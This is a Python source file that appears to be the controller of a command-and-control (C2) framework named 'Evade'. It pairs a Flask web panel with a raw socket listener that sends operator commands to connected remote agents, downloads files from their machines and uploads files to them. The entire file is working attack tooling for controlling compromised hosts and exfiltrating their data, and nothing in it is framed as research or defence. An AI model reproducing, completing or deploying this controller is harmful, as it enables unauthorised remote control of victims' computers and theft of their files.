import socket
import threading
import time
import flask
from flask import *
import os

ip = '127.0.0.1'
port = 6666

thread_index = 0
THREADS = []
CMD_INPUT = []
CMD_OUTPUT = []
IPS = []
active_connections = 0

app = Flask(__name__)

for i in range(20):
    CMD_INPUT.append('')
    CMD_OUTPUT.append('')
    IPS.append('')

def handle_conn(connection, address, thread_index):
    global CMD_INPUT
    global CMD_OUTPUT
    global active_connections
    active_connections += 1
    while CMD_INPUT[thread_index] != 'quit':
        msg = connection.recv(2048).decode()
        print(f"Received message from client: {msg}")
        CMD_OUTPUT[thread_index] = msg
        while True:
            if CMD_INPUT[thread_index] != '':
                if CMD_INPUT[thread_index].split(" ")[0] == 'download':
                    filename = CMD_INPUT[thread_index].split(" ")[1]
                    cmd = CMD_INPUT[thread_index]
                    # Send command to client
                    connection.send(cmd.encode())
                    
                    # First, receive confirmation if it's a file and exists
                    agent_response = connection.recv(2048).decode()
                    
                    if agent_response == "File does not exist":
                        CMD_OUTPUT[thread_index] = "Error: File does not exist on agent side."
                    elif agent_response == "Is a directory":
                        CMD_OUTPUT[thread_index] = "Error: Path is a directory, not a file."
                    else:
                        try:
                            # If the file exists, receive file size first (assuming this is sent as text)
                            file_size = int(agent_response)
                            received_size = 0
                            contents = b''
                            
                            if not os.path.exists('output'):
                                os.makedirs('output')
                            file_path = os.path.join('output', filename)
                            
                            with open(file_path, 'wb') as f:
                                while received_size < file_size:
                                    chunk = connection.recv(2048)
                                    if not chunk:
                                        break  # This should not happen unless there's a connection issue
                                    f.write(chunk)
                                    received_size += len(chunk)
                            
                            CMD_OUTPUT[thread_index] = 'File Transfer Successful.'
                        except IOError as e:
                            CMD_OUTPUT[thread_index] = f"Error: Unable to write file - {e}"
                        except ValueError:
                            # This catches errors if the file size isn't properly decoded (e.g., not a valid integer)
                            CMD_OUTPUT[thread_index] = "Error: Invalid file size received."


        
                elif CMD_INPUT[thread_index].split(" ")[0] == 'upload':
                    filename = CMD_INPUT[thread_index].split(" ")[1]
                    upload_dir = 'E:\\Github\\Repos\\Evade-A-C2-Framework\\upload'
                    file_path = os.path.join(upload_dir, filename)
                    if os.path.exists(file_path):
                        file_size = os.path.getsize(file_path)
                        if file_size > 0:
                            cmd = f"{CMD_INPUT[thread_index]} {file_size}"
                            connection.send(cmd.encode())
                            response = connection.recv(2048).decode()
                            if response.strip() == "Ready for upload":
                                with open(file_path, 'rb') as f:
                                    while True:
                                        chunk = f.read(2048)
                                        if not chunk: 
                                            # Here, instead of sending EOF directly, wait for the agent to acknowledge completion.
                                            break
                                        connection.send(chunk)
                                # Wait for the agent to send a "File Upload Successful" message.
                                response = connection.recv(2048).decode()
                                if response.startswith("File Upload Successful"):
                                    CMD_OUTPUT[thread_index] = "File uploaded successfully."
                                else:
                                    CMD_OUTPUT[thread_index] = "Error during file upload."
                            else:
                                CMD_OUTPUT[thread_index] = "Client not ready to receive file."
                        else:
                            CMD_OUTPUT[thread_index] = "Error: File is empty."
                        CMD_INPUT[thread_index] = ''
                    else:
                        CMD_OUTPUT[thread_index] = "Error: File not found."
                        CMD_INPUT[thread_index] = ''


                elif CMD_INPUT[thread_index].split(" ")[0] == 'cd':
                    cmd = CMD_INPUT[thread_index]
                    try:
                        connection.send(cmd.encode())
                        CMD_INPUT[thread_index] = ''
                        response = connection.recv(2048).decode()
                        CMD_OUTPUT[thread_index] = response
                    except Exception as e:
                        CMD_OUTPUT[thread_index] = f"Error changing directory: {e}"
                else:
                    msg = CMD_INPUT[thread_index]
                    #print(f"Sending message to client: {msg}")
                    connection.send(msg.encode())
                    CMD_INPUT[thread_index] = ''
                    break

    active_connections -= 1
    connection_sakkaune(connection)

def connection_sakkaune(connection):
    connection.close()

def server_socket():
    ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ss.bind((ip, port))
    ss.listen(5)
    global THREADS
    global IPS
    print(f"Server listening on {ip}:{port}")

    while True:
        connection, address = ss.accept()
        thread_index = len(THREADS)
        t = threading.Thread(target=handle_conn, args=(connection, address, thread_index))
        THREADS.append(t)
        IPS.append(address)
        print(f"Active connections: {active_connections}")
        t.start()

@app.before_request
def before_request():
    s1 = threading.Thread(target=server_socket)
    s1.start()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/tcpagents')
def tcpagentsagents():
    return render_template('agents.html', threads=THREADS, ips=IPS)

@app.route('/httpagents')
def httpagents():
    return render_template('agents.html', threads=THREADS, ips=IPS)

@app.route('/<agentname>/executecmd')
def executecmd(agentname):
    return render_template("execute.html", name=agentname)

@app.route('/<agentname>/execute', methods=['GET', 'POST'])
def execute(agentname):
    if request.method == 'POST':
        cmd = request.form['command']
        for i in THREADS:
            if agentname in i.name:
                req_index = THREADS.index(i)
                CMD_INPUT[req_index] = cmd
                time.sleep(1)
                cmdoutput = CMD_OUTPUT[req_index]
                return render_template("execute.html", cmdoutput=cmdoutput, name=agentname)

if __name__ == '__main__':
    app.run(debug=True, port=5001)
